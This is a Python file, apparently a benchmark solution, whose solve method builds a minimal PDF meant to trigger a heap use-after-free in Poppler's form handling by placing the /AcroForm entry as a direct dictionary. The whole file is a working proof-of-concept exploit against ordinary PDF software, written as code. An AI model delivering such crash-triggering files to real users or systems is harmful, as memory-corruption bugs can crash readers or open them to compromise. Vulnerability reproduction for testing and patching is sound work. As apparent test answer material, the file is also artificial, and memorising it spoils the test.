import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Poppler's Form destruction.
        The vulnerability occurs when a Form is initialized with a direct dictionary object (instead of an indirect reference),
        causing a reference counting issue where the dictionary is freed twice (once by Form, once by Catalog).
        """
        
        # Minimal PDF structure
        # Object 1: Catalog
        # The trigger is the /AcroForm entry being a direct dictionary
        obj1 = (
            b"1 0 obj\n"
            b"<<\n"
            b"/Type /Catalog\n"
            b"/Pages 2 0 R\n"
            b"/AcroForm << /Fields [] /DA (/Helv 0 Tf 0 g) >>\n"
            b">>\n"
            b"endobj\n"
        )
        
        # Object 2: Pages
        obj2 = (
            b"2 0 obj\n"
            b"<<\n"
            b"/Type /Pages\n"
            b"/Kids [3 0 R]\n"
            b"/Count 1\n"
            b">>\n"
            b"endobj\n"
        )
        
        # Object 3: Page (Minimal)
        obj3 = (
            b"3 0 obj\n"
            b"<<\n"
            b"/Type /Page\n"
            b"/Parent 2 0 R\n"
            b"/MediaBox [0 0 612 792]\n"
            b"/Resources << >>\n"
            b">>\n"
            b"endobj\n"
        )
        
        objects = [obj1, obj2, obj3]
        
        # Build the PDF content
        content = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
        offsets = []
        
        for obj in objects:
            offsets.append(len(content))
            content.extend(obj)
            
        # XREF Table
        xref_offset = len(content)
        content.extend(b"xref\n")
        content.extend(f"0 {len(objects) + 1}\n".encode('ascii'))
        content.extend(b"0000000000 65535 f \n")
        
        for offset in offsets:
            content.extend(f"{offset:010d} 00000 n \n".encode('ascii'))
            
        # Trailer
        content.extend(b"trailer\n")
        content.extend(f"<< /Size {len(objects) + 1} /Root 1 0 R >>\n".encode('ascii'))
        content.extend(b"startxref\n")
        content.extend(f"{xref_offset}\n".encode('ascii'))
        content.extend(b"%%EOF")
        
        return bytes(content)
